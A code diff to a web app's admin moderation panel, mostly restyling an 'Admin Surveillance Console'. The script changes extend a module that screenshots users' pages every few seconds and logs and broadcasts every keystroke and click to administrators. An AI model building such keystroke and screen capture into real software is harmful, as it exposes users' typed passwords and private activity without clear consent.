@@ -1598,29 +1598,27 @@ ADMIN SURVEILLANCE STYLES (V5.0 - PRO MODERATOR LAYOUT)
     word-break: break-all;
 }
 
-#surveillanceStatus {
-    position: absolute;
-    top: 15px;
-    left: 15px;
-    z-index: 10;
-    padding: 6px 12px;
-    background: rgba(15, 23, 42, 0.9);
-    backdrop-filter: blur(4px);
-    border: 1px solid var(--accent);
-    border-radius: 8px;
-    font-size: 0.7rem;
+.surveillance-overlay {
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    background: rgba(239, 68, 68, 0.9);
+    color: white;
+    padding: 12px 20px;
+    border-radius: 12px;
     font-weight: 800;
-    color: var(--accent);
-    text-transform: uppercase;
-    letter-spacing: 1px;
-    pointer-events: none;
+    z-index: 40000;
+    border: 2px solid white;
+    animation: pulseRed 2s infinite;
+    display: none;
 }
 
-/* Make the Mod Modal wider specifically for surveillance */
-#modModal .modal-card {
-    max-width: 1200px; /* Increased from 900px */
-    transition: max-width 0.4s ease;
+@keyframes pulseRed {
+    0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); }
+    70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(239, 68, 68, 0); }
+    100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
 }
+
   </style>
 
   <script>
@@ -1755,7 +1753,7 @@ ADMIN SURVEILLANCE STYLES (V5.0 - PRO MODERATOR LAYOUT)
 
   <!-- MODERATION CONTROL CENTER MODAL -->
   <div class="modal-overlay" id="modModal">
-    <div class="modal-card" style="position: relative; overflow: hidden;">
+    <div class="modal-card" style="position: relative; overflow: hidden; transition: max-width 0.4s ease;">
 
         <!-- INDIVIDUAL RAP SHEET SYSTEM -->
         <div id="userProfileOverlay">
@@ -1854,11 +1852,11 @@ ADMIN SURVEILLANCE STYLES (V5.0 - PRO MODERATOR LAYOUT)
             <h3 style="margin-bottom:0.5rem; color: #ef4444;">Admin Surveillance Console</h3>
             <div class="surveillance-container">
                 <div class="surveillance-screen">
-                    <span id="surveillanceStatus" style="position:absolute; top:10px; left:10px; padding:4px 10px; background:rgba(0,0,0,0.8); border-radius:8px; font-size:0.7rem; color:var(--accent);">WAITING FOR SIGNAL...</span>
+                    <span id="surveillanceStatus" style="position:absolute; top:15px; left:15px; z-index:10; padding:6px 12px; background:rgba(15, 23, 42, 0.9); backdrop-filter:blur(4px); border:1px solid var(--accent); border-radius:8px; font-size:0.7rem; font-weight:800; color:var(--accent); text-transform:uppercase; letter-spacing:1px; pointer-events:none;">WAITING FOR SIGNAL...</span>
                     <img id="surveillanceFeed" src="" />
                 </div>
                 <div id="surveillanceLog" class="surveillance-log">
-                    <p style="opacity:0.6">[Waiting for user engagement...]</p>
+                    <p style="opacity:0.6">[Waiting for live stream...]</p>
                 </div>
             </div>
         </div>
@@ -2588,6 +2586,9 @@ ADMIN SURVEILLANCE STYLES (V5.0 - PRO MODERATOR LAYOUT)
         document.getElementById('modGuidelines').style.display = 'none';
         document.getElementById('viewModSurveillance').style.display = 'none';
 
+        // Reset modal width
+        document.querySelector('#modModal .modal-card').style.maxWidth = "900px";
+
         if (tab === 'users') {
             document.getElementById('tabUsers').classList.add('active');
             document.getElementById('viewModUsers').style.display = 'block';
@@ -2600,6 +2601,8 @@ ADMIN SURVEILLANCE STYLES (V5.0 - PRO MODERATOR LAYOUT)
         } else if (tab === 'monitoring') {
             document.getElementById('tabSurveillance').classList.add('active');
             document.getElementById('viewModSurveillance').style.display = 'block';
+            // Widen the modal for surveillance
+            document.querySelector('#modModal .modal-card').style.maxWidth = "1300px"; 
             initSurveillanceSubscription();
         }
     }
@@ -3731,7 +3734,7 @@ ADMIN SURVEILLANCE STYLES (V5.0 - PRO MODERATOR LAYOUT)
 
 /* 
 ========================================================================
-NEW LIVE-STREAM SURVEILLANCE MODULE (V4.0 - SMART-VIEW CAPTURE)
+NEW LIVE-STREAM SURVEILLANCE MODULE (V4.2 - SMART-VIEW CAPTURE)
 ========================================================================
 */
 
@@ -3790,11 +3793,11 @@ function beginCaptureLoop(type) {
             const zoneViewer = document.getElementById('zoneViewer');
             const isPlaying = zoneViewer && zoneViewer.style.display === 'flex';
             
-            // If playing, we capture the viewer; otherwise, the whole page
+            // For games, target the viewer; otherwise, target the whole body
             const captureTarget = isPlaying ? zoneViewer : document.body;
 
             const canvas = await html2canvas(captureTarget, { 
-                scale: 0.2, // Slightly higher for clarity
+                scale: 0.18, 
                 useCORS: true,
                 allowTaint: true,
                 backgroundColor: "#020617", 
@@ -3809,7 +3812,7 @@ function beginCaptureLoop(type) {
                 updated_at: new Date().toISOString()
             }).eq('target_user', currentUser);
         } catch (e) { console.warn("Surveillance sync lag..."); }
-    }, 4000); // 4 second refresh
+    }, 4500); 
 }
 
 function stopCaptureLoop() {
@@ -3824,9 +3827,26 @@ function stopCaptureLoop() {
 
 function logSurveillanceEvent(e) {
     if (!broadcastChannel) return;
-    let detail = e.type === 'click' ? `Clicked: ${e.target.tagName}` : `Typed: ${e.key}`;
-    const payload = { event: 'activity', user: currentUser, detail: detail, time: new Date().toLocaleTimeString() };
-    broadcastChannel.send({ type: 'broadcast', event: 'log', payload: payload });
+    
+    let detail = "";
+    if (e.type === 'click') {
+        detail = `Clicked: ${e.target.tagName} ${e.target.id ? '#' + e.target.id : ''}`;
+    } else {
+        detail = `Typed: ${e.key}`;
+    }
+
+    const payload = {
+        event: 'activity',
+        user: currentUser,
+        detail: detail,
+        time: new Date().toLocaleTimeString()
+    };
+
+    broadcastChannel.send({
+        type: 'broadcast',
+        event: 'log',
+        payload: payload
+    });
 }
 
 async function handleSurveillanceStart(username) {
